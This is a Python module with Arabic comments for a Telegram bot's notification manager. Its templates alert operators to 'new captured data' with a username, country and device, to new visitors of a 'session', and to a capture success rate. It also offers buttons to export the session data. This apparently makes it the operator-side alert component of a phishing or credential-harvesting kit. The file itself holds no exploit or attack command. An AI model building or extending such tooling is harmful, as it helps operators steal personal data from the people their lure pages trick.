"""
🔔 نظام الإشعارات الفورية المتقدم
يدير إرسال الإشعارات الفورية للمستخدمين والمدراء
"""

import asyncio
import logging
from typing import Dict, List, Any, Optional, Callable
from datetime import datetime, timedelta
from aiogram import Bot
from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton

from ..database import db_manager
from ..config import settings

logger = logging.getLogger(__name__)

class NotificationManager:
    """مدير الإشعارات المتقدم"""
    
    def __init__(self, bot: Bot):
        self.bot = bot
        self.notification_queue = asyncio.Queue()
        self.active_subscriptions = {}
        self.notification_templates = {}
        self.rate_limits = {}
        self.is_running = False
        
        # تحديد قوالب الإشعارات
        self._setup_notification_templates()
    
    def _setup_notification_templates(self):
        """إعداد قوالب الإشعارات"""
        
        self.notification_templates = {
            'new_capture': {
                'title': '🎯 بيانات جديدة مُلتقطة!',
                'template': '''
🎯 **تم التقاط بيانات جديدة!**

🌐 **الجلسة:** {session_id}
👤 **المستخدم:** {username}
🌍 **البلد:** {country}
🕒 **الوقت:** {timestamp}
📱 **الجهاز:** {device_info}

🔗 **عرض التفاصيل** أو **إدارة الجلسة**
''',
                'priority': 'high',
                'sound': True
            },
            
            'new_visit': {
                'title': '👥 زائر جديد',
                'template': '''
👥 **زائر جديد للجلسة**

🌐 **الجلسة:** {session_id}
🌍 **الموقع:** {location}
📱 **المتصفح:** {browser}
🕒 **الوقت:** {timestamp}

📊 **إجمالي الزوار:** {total_visitors}
''',
                'priority': 'medium',
                'sound': False
            },
            
            'session_error': {
                'title': '⚠️ خطأ في الجلسة',
                'template': '''
⚠️ **تحذير: خطأ في الجلسة**

🌐 **الجلسة:** {session_id}
❌ **نوع الخطأ:** {error_type}
📝 **التفاصيل:** {error_details}
🕒 **الوقت:** {timestamp}

🔧 **يُنصح بفحص الجلسة فورًا**
''',
                'priority': 'critical',
                'sound': True
            },
            
            'session_stopped': {
                'title': '🛑 تم إيقاف الجلسة',
                'template': '''
🛑 **تم إيقاف الجلسة**

🌐 **الجلسة:** {session_id}
👥 **إجمالي الزوار:** {total_visitors}
🎯 **البيانات المُلتقطة:** {total_captures}
⏱️ **مدة التشغيل:** {duration}
🕒 **وقت الإيقاف:** {timestamp}

📊 **عرض التقرير النهائي**
''',
                'priority': 'medium',
                'sound': False
            },
            
            'suspicious_activity': {
                'title': '🚨 نشاط مشبوه',
                'template': '''
🚨 **تم اكتشاف نشاط مشبوه!**

🌐 **الجلسة:** {session_id}
🔍 **نوع النشاط:** {activity_type}
🌍 **الموقع:** {location}
⚡ **مستوى الخطر:** {risk_level}
🕒 **الوقت:** {timestamp}

🛡️ **فحص فوري مطلوب**
''',
                'priority': 'critical',
                'sound': True
            },
            
            'high_success_rate': {
                'title': '🎉 معدل نجاح مرتفع',
                'template': '''
🎉 **تهانينا! معدل نجاح ممتاز**

🌐 **الجلسة:** {session_id}
📈 **معدل النجاح:** {success_rate}%
🎯 **البيانات المُلتقطة:** {captures_count}
👥 **الزوار:** {visitors_count}
🕒 **الوقت:** {timestamp}

🔥 **استمر بالعمل الرائع!**
''',
                'priority': 'low',
                'sound': False
            },
            
            'daily_report': {
                'title': '📊 التقرير اليومي',
                'template': '''
📊 **تقرير النشاط اليومي**

📅 **التاريخ:** {date}
🌐 **الجلسات النشطة:** {active_sessions}
👥 **إجمالي الزوار:** {total_visitors}
🎯 **البيانات المُلتقطة:** {total_captures}
📈 **معدل النجاح العام:** {overall_success_rate}%

📋 **عرض التقرير المفصل**
''',
                'priority': 'low',
                'sound': False
            }
        }
    
    async def start(self):
        """بدء خدمة الإشعارات"""
        
        if self.is_running:
            return
        
        self.is_running = True
        
        # بدء معالج الإشعارات
        asyncio.create_task(self._notification_processor())
        
        logger.info("تم بدء خدمة الإشعارات")
    
    async def stop(self):
        """إيقاف خدمة الإشعارات"""
        
        self.is_running = False
        logger.info("تم إيقاف خدمة الإشعارات")
    
    async def _notification_processor(self):
        """معالج الإشعارات الرئيسي"""
        
        while self.is_running:
            try:
                # انتظار إشعار جديد
                notification = await asyncio.wait_for(
                    self.notification_queue.get(), timeout=1.0
                )
                
                # معالجة الإشعار
                await self._process_notification(notification)
                
            except asyncio.TimeoutError:
                continue
            except Exception as e:
                logger.error(f"خطأ في معالج الإشعارات: {e}")
    
    async def _process_notification(self, notification: Dict[str, Any]):
        """معالجة إشعار واحد"""
        
        try:
            notification_type = notification['type']
            data = notification['data']
            recipients = notification.get('recipients', [])
            
            # التحقق من القالب
            if notification_type not in self.notification_templates:
                logger.warning(f"قالب الإشعار غير موجود: {notification_type}")
                return
            
            template = self.notification_templates[notification_type]
            
            # إنشاء محتوى الإشعار
            message_text = template['template'].format(**data)
            
            # إنشاء لوحة مفاتيح حسب نوع الإشعار
            keyboard = self._create_notification_keyboard(notification_type, data)
            
            # إرسال الإشعار للمستلمين
            for recipient_id in recipients:
                if await self._check_rate_limit(recipient_id, notification_type):
                    await self._send_notification(
                        recipient_id, 
                        message_text, 
                        keyboard,
                        template.get('priority', 'medium')
                    )
            
        except Exception as e:
            logger.error(f"خطأ في معالجة الإشعار: {e}")
    
    async def _send_notification(self, user_id: int, message: str, keyboard: InlineKeyboardMarkup, priority: str):
        """إرسال إشعار لمستخدم محدد"""
        
        try:
            # إضافة مؤشر الأولوية
            priority_indicators = {
                'critical': '🚨',
                'high': '🔥',
                'medium': '📢',
                'low': 'ℹ️'
            }
            
            indicator = priority_indicators.get(priority, '📢')
            final_message = f"{indicator} {message}"
            
            await self.bot.send_message(
                chat_id=user_id,
                text=final_message,
                reply_markup=keyboard,
                parse_mode="Markdown"
            )
            
            # تسجيل الإشعار
            await db_manager.log_system_event(
                event_type='notification_sent',
                description=f"تم إرسال إشعار {priority} للمستخدم {user_id}",
                user_id=user_id
            )
            
        except Exception as e:
            logger.error(f"خطأ في إرسال الإشعار للمستخدم {user_id}: {e}")
    
    def _create_notification_keyboard(self, notification_type: str, data: Dict[str, Any]) -> InlineKeyboardMarkup:
        """إنشاء لوحة مفاتيح للإشعار"""
        
        buttons = []
        
        if notification_type == 'new_capture':
            session_id = data.get('session_id')
            buttons = [
                [
                    InlineKeyboardButton(
                        text="👁️ عرض البيانات",
                        callback_data=f"view_capture_{data.get('capture_id')}"
                    ),
                    InlineKeyboardButton(
                        text="🌐 إدارة الجلسة",
                        callback_data=f"manage_session_{session_id}"
                    )
                ],
                [
                    InlineKeyboardButton(
                        text="📊 إحصائيات الجلسة",
                        callback_data=f"session_stats_{session_id}"
                    )
                ]
            ]
            
        elif notification_type == 'new_visit':
            session_id = data.get('session_id')
            buttons = [
                [
                    InlineKeyboardButton(
                        text="📊 إحصائيات الجلسة",
                        callback_data=f"session_stats_{session_id}"
                    ),
                    InlineKeyboardButton(
                        text="🌐 إدارة الجلسة",
                        callback_data=f"manage_session_{session_id}"
                    )
                ]
            ]
            
        elif notification_type == 'session_error':
            session_id = data.get('session_id')
            buttons = [
                [
                    InlineKeyboardButton(
                        text="🔧 فحص الجلسة",
                        callback_data=f"diagnose_session_{session_id}"
                    ),
                    InlineKeyboardButton(
                        text="🔄 إعادة التشغيل",
                        callback_data=f"restart_session_{session_id}"
                    )
                ]
            ]
            
        elif notification_type == 'session_stopped':
            session_id = data.get('session_id')
            buttons = [
                [
                    InlineKeyboardButton(
                        text="📊 التقرير النهائي",
                        callback_data=f"final_report_{session_id}"
                    ),
                    InlineKeyboardButton(
                        text="💾 تصدير البيانات",
                        callback_data=f"export_session_{session_id}"
                    )
                ]
            ]
            
        elif notification_type == 'suspicious_activity':
            session_id = data.get('session_id')
            buttons = [
                [
                    InlineKeyboardButton(
                        text="🔍 فحص فوري",
                        callback_data=f"investigate_{session_id}"
                    ),
                    InlineKeyboardButton(
                        text="🛑 إيقاف الجلسة",
                        callback_data=f"emergency_stop_{session_id}"
                    )
                ]
            ]
            
        elif notification_type == 'daily_report':
            buttons = [
                [
                    InlineKeyboardButton(
                        text="📋 التقرير المفصل",
                        callback_data="detailed_daily_report"
                    ),
                    InlineKeyboardButton(
                        text="📊 الإحصائيات",
                        callback_data="daily_statistics"
                    )
                ]
            ]
        
        # إضافة زر إغلاق الإشعار
        buttons.append([
            InlineKeyboardButton(
                text="❌ إغلاق",
                callback_data="close_notification"
            )
        ])
        
        return InlineKeyboardMarkup(inline_keyboard=buttons)
    
    async def _check_rate_limit(self, user_id: int, notification_type: str) -> bool:
        """فحص حدود معدل الإرسال"""
        
        current_time = datetime.utcnow()
        user_key = f"{user_id}_{notification_type}"
        
        # حدود مختلفة حسب نوع الإشعار
        limits = {
            'new_visit': timedelta(minutes=5),      # زائر جديد كل 5 دقائق
            'new_capture': timedelta(seconds=30),   # بيانات جديدة كل 30 ثانية
            'session_error': timedelta(minutes=1),  # خطأ كل دقيقة
            'suspicious_activity': timedelta(seconds=10),  # نشاط مشبوه كل 10 ثواني
            'daily_report': timedelta(hours=23),    # تقرير يومي مرة واحدة
        }
        
        limit = limits.get(notification_type, timedelta(minutes=1))
        
        if user_key in self.rate_limits:
            last_sent = self.rate_limits[user_key]
            if current_time - last_sent < limit:
                return False
        
        self.rate_limits[user_key] = current_time
        return True
    
    async def notify_new_capture(self, session_id: str, capture_data: Dict[str, Any]):
        """إشعار بيانات جديدة مُلتقطة"""
        
        # تحضير بيانات الإشعار
        notification_data = {
            'session_id': session_id,
            'username': capture_data.get('username', 'غير محدد'),
            'country': capture_data.get('country', 'غير محدد'),
            'timestamp': datetime.utcnow().strftime('%H:%M:%S'),
            'device_info': capture_data.get('device_info', 'غير محدد'),
            'capture_id': capture_data.get('id')
        }
        
        # الحصول على المستلمين
        recipients = await self._get_notification_recipients('new_capture', session_id)
        
        # إضافة الإشعار للطابور
        await self.notification_queue.put({
            'type': 'new_capture',
            'data': notification_data,
            'recipients': recipients
        })
    
    async def notify_new_visit(self, session_id: str, visit_data: Dict[str, Any]):
        """إشعار زائر جديد"""
        
        notification_data = {
            'session_id': session_id,
            'location': f"{visit_data.get('city', 'غير محدد')}, {visit_data.get('country', 'غير محدد')}",
            'browser': visit_data.get('browser', 'غير محدد'),
            'timestamp': datetime.utcnow().strftime('%H:%M:%S'),
            'total_visitors': visit_data.get('total_visitors', 0)
        }
        
        recipients = await self._get_notification_recipients('new_visit', session_id)
        
        await self.notification_queue.put({
            'type': 'new_visit',
            'data': notification_data,
            'recipients': recipients
        })
    
    async def notify_session_error(self, session_id: str, error_data: Dict[str, Any]):
        """إشعار خطأ في الجلسة"""
        
        notification_data = {
            'session_id': session_id,
            'error_type': error_data.get('error_type', 'خطأ غير محدد'),
            'error_details': error_data.get('details', 'لا توجد تفاصيل'),
            'timestamp': datetime.utcnow().strftime('%H:%M:%S')
        }
        
        recipients = await self._get_notification_recipients('session_error', session_id)
        
        await self.notification_queue.put({
            'type': 'session_error',
            'data': notification_data,
            'recipients': recipients
        })
    
    async def notify_session_stopped(self, session_id: str, session_stats: Dict[str, Any]):
        """إشعار إيقاف الجلسة"""
        
        notification_data = {
            'session_id': session_id,
            'total_visitors': session_stats.get('total_visitors', 0),
            'total_captures': session_stats.get('total_captures', 0),
            'duration': session_stats.get('duration', 'غير محدد'),
            'timestamp': datetime.utcnow().strftime('%H:%M:%S')
        }
        
        recipients = await self._get_notification_recipients('session_stopped', session_id)
        
        await self.notification_queue.put({
            'type': 'session_stopped',
            'data': notification_data,
            'recipients': recipients
        })
    
    async def notify_suspicious_activity(self, session_id: str, activity_data: Dict[str, Any]):
        """إشعار نشاط مشبوه"""
        
        notification_data = {
            'session_id': session_id,
            'activity_type': activity_data.get('type', 'نشاط غير محدد'),
            'location': activity_data.get('location', 'غير محدد'),
            'risk_level': activity_data.get('risk_level', 'متوسط'),
            'timestamp': datetime.utcnow().strftime('%H:%M:%S')
        }
        
        recipients = await self._get_notification_recipients('suspicious_activity', session_id)
        
        await self.notification_queue.put({
            'type': 'suspicious_activity',
            'data': notification_data,
            'recipients': recipients
        })
    
    async def send_daily_report(self, report_data: Dict[str, Any]):
        """إرسال التقرير اليومي"""
        
        notification_data = {
            'date': datetime.utcnow().strftime('%Y-%m-%d'),
            'active_sessions': report_data.get('active_sessions', 0),
            'total_visitors': report_data.get('total_visitors', 0),
            'total_captures': report_data.get('total_captures', 0),
            'overall_success_rate': report_data.get('success_rate', 0)
        }
        
        recipients = await self._get_notification_recipients('daily_report')
        
        await self.notification_queue.put({
            'type': 'daily_report',
            'data': notification_data,
            'recipients': recipients
        })
    
    async def _get_notification_recipients(self, notification_type: str, session_id: str = None) -> List[int]:
        """الحصول على قائمة المستلمين للإشعار"""
        
        recipients = []
        
        try:
            # إشعارات الجلسة: إرسال لصاحب الجلسة والمدراء
            if session_id and notification_type in ['new_capture', 'new_visit', 'session_error', 'session_stopped']:
                session = await db_manager.get_session_by_id(session_id)
                if session:
                    recipients.append(session.user_id)
                
                # إضافة المدراء للإشعارات المهمة
                if notification_type in ['new_capture', 'session_error']:
                    admins = await db_manager.get_users_by_role(['admin', 'super_admin'])
                    recipients.extend([admin.user_id for admin in admins])
            
            # التقارير اليومية: المدراء فقط
            elif notification_type == 'daily_report':
                admins = await db_manager.get_users_by_role(['admin', 'super_admin'])
                recipients.extend([admin.user_id for admin in admins])
            
            # النشاط المشبوه: جميع المدراء
            elif notification_type == 'suspicious_activity':
                admins = await db_manager.get_users_by_role(['admin', 'super_admin'])
                recipients.extend([admin.user_id for admin in admins])
            
            # إزالة التكرارات
            recipients = list(set(recipients))
            
        except Exception as e:
            logger.error(f"خطأ في الحصول على المستلمين: {e}")
        
        return recipients
    
    async def subscribe_user(self, user_id: int, notification_types: List[str]):
        """اشتراك مستخدم في أنواع إشعارات محددة"""
        
        if user_id not in self.active_subscriptions:
            self.active_subscriptions[user_id] = set()
        
        self.active_subscriptions[user_id].update(notification_types)
        
        logger.info(f"المستخدم {user_id} اشترك في: {', '.join(notification_types)}")
    
    async def unsubscribe_user(self, user_id: int, notification_types: List[str]):
        """إلغاء اشتراك مستخدم من أنواع إشعارات محددة"""
        
        if user_id in self.active_subscriptions:
            self.active_subscriptions[user_id].difference_update(notification_types)
        
        logger.info(f"المستخدم {user_id} ألغى الاشتراك من: {', '.join(notification_types)}")
    
    async def get_user_subscriptions(self, user_id: int) -> List[str]:
        """الحصول على اشتراكات المستخدم"""
        
        return list(self.active_subscriptions.get(user_id, set()))

# متغير عام (سيتم تهيئته في main.py)
notification_manager: Optional[NotificationManager] = None